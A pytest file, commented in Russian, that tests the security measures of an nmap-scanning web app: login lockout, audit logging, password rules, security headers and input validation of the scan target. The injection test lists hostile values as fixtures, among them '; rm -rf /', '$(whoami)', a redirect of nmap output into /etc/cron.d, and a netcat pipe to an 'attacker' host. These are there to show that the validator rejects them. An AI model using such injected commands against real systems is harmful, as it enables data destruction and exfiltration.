"""Тесты защитных мер: перебор паролей, слабые пароли, заголовки,
устойчивость цели скана к подстановке аргументов nmap.
"""

from unittest.mock import MagicMock

import pytest

from app.database import SessionLocal
from app.models import AuditLog, User
from app.security.login_guard import ACTION_FAILED, MAX_ATTEMPTS
from app.security.scope import target_in_scope


# ── защита от перебора ──


def _clear_failures(username):
    """Изоляция тестов друг от друга. В приложении журнал НЕ чистится —
    это делается только здесь, чтобы соседние тесты не влияли на счётчик."""
    db = SessionLocal()
    try:
        db.query(AuditLog).filter(
            AuditLog.action.in_([ACTION_FAILED, "login"]),
            AuditLog.detail == username,
        ).delete(synchronize_session=False)
        db.commit()
    finally:
        db.close()


def test_failed_login_is_recorded_in_audit(client, admin_headers):
    """Раньше неудачные входы не логировались — подбор не оставлял следов."""
    _clear_failures("ghost")
    client.post("/auth/login", data={"username": "ghost", "password": "wrong-one"})

    audit = client.get("/audit", headers=admin_headers).json()["items"]
    assert any(e["action"] == ACTION_FAILED and e["detail"] == "ghost" for e in audit)
    _clear_failures("ghost")


def test_repeated_failures_lock_the_account(client):
    _clear_failures("bruteforced")
    for _ in range(MAX_ATTEMPTS):
        r = client.post("/auth/login", data={"username": "bruteforced", "password": "nope"})
        assert r.status_code == 401

    # Следующая попытка уже отбивается лимитом, а не проверкой пароля
    r = client.post("/auth/login", data={"username": "bruteforced", "password": "nope"})
    assert r.status_code == 429
    assert "Retry-After" in r.headers
    _clear_failures("bruteforced")


def test_lockout_does_not_leak_whether_user_exists(client):
    """Ответ одинаков для несуществующего логина и неверного пароля."""
    _clear_failures("nosuchuser")
    ghost = client.post("/auth/login", data={"username": "nosuchuser", "password": "whatever"})
    real = client.post("/auth/login", data={"username": "admin", "password": "wrong-password"})

    assert ghost.status_code == real.status_code == 401
    assert ghost.json()["detail"] == real.json()["detail"]
    _clear_failures("nosuchuser")
    _clear_failures("admin")


def test_successful_login_resets_the_counter(client):
    _clear_failures("admin")
    for _ in range(MAX_ATTEMPTS - 1):
        client.post("/auth/login", data={"username": "admin", "password": "wrong"})

    ok = client.post("/auth/login", data={"username": "admin", "password": "admin"})
    assert ok.status_code == 200

    # Счётчик отсчитывается от успешного входа — снова можно ошибаться
    r = client.post("/auth/login", data={"username": "admin", "password": "wrong"})
    assert r.status_code == 401
    _clear_failures("admin")


def test_successful_login_does_not_erase_failure_history(client, admin_headers):
    """Первая версия удаляла записи о неудачах после успешного входа.
    Последствие: подобравший пароль стирал следы своих попыток самим
    фактом успеха — исчезали ровно те записи, ради которых журнал нужен."""
    _clear_failures("admin")
    for _ in range(3):
        client.post("/auth/login", data={"username": "admin", "password": "wrong"})

    client.post("/auth/login", data={"username": "admin", "password": "admin"})

    audit = client.get("/audit?action=login_failed&limit=200", headers=admin_headers).json()
    failures = [e for e in audit["items"] if e["detail"] == "admin"]
    assert len(failures) == 3, "следы неудачных попыток стёрты успешным входом"
    _clear_failures("admin")


# ── требования к паролю ──


def test_short_password_rejected(client, admin_headers):
    r = client.post(
        "/users",
        headers=admin_headers,
        json={"username": "shorty", "password": "kort", "role": "viewer"},
    )
    assert r.status_code == 422


def test_password_of_sufficient_length_accepted(client, admin_headers):
    r = client.post(
        "/users",
        headers=admin_headers,
        json={"username": "longpass", "password": "dostatochno-dlinnyy", "role": "viewer"},
    )
    assert r.status_code == 200

    db = SessionLocal()
    try:
        db.query(User).filter(User.username == "longpass").delete()
        db.commit()
    finally:
        db.close()


def test_too_short_username_rejected(client, admin_headers):
    r = client.post(
        "/users",
        headers=admin_headers,
        json={"username": "ab", "password": "dostatochno-dlinnyy", "role": "viewer"},
    )
    assert r.status_code == 422


# ── security-заголовки ──


def test_api_response_carries_security_headers(client):
    r = client.get("/health")
    assert r.headers["X-Content-Type-Options"] == "nosniff"
    assert r.headers["X-Frame-Options"] == "DENY"
    assert r.headers["Referrer-Policy"] == "no-referrer"
    assert r.headers["Cache-Control"] == "no-store"
    assert "default-src 'none'" in r.headers["Content-Security-Policy"]


def test_swagger_is_not_broken_by_strict_csp(client):
    """Строгий CSP убил бы Swagger: он грузит скрипты с CDN."""
    r = client.get("/docs")
    assert r.status_code == 200
    assert "Content-Security-Policy" not in r.headers


# ── цель скана как вектор атаки ──


@pytest.mark.parametrize(
    "hostile",
    [
        "-oX /tmp/pwned.xml",
        "192.168.1.10 --script=http-shellshock",
        "192.168.1.10; rm -rf /",
        "192.168.1.10 -oN /etc/cron.d/evil",
        "$(whoami)",
        "`id`",
        "192.168.1.10|nc attacker 4444",
        "--script vuln 192.168.1.10",
        "192.168.1.10\n8.8.8.8",
        "",
    ],
)
def test_scope_check_rejects_argument_injection(hostile):
    """Проверка scope работает и как валидатор ввода: ip_network() не примет
    ничего, кроме чистого IP или CIDR, поэтому подставить свои аргументы
    в командную строку nmap через поле target нельзя."""
    db = MagicMock()
    scope = MagicMock()
    scope.cidr = "192.168.1.0/24"
    db.query.return_value.all.return_value = [scope]

    assert target_in_scope(hostile, db) is False


def test_legitimate_target_still_passes():
    """Контроль: защита не должна отбивать нормальную цель."""
    db = MagicMock()
    scope = MagicMock()
    scope.cidr = "192.168.1.0/24"
    db.query.return_value.all.return_value = [scope]

    assert target_in_scope("192.168.1.10", db) is True
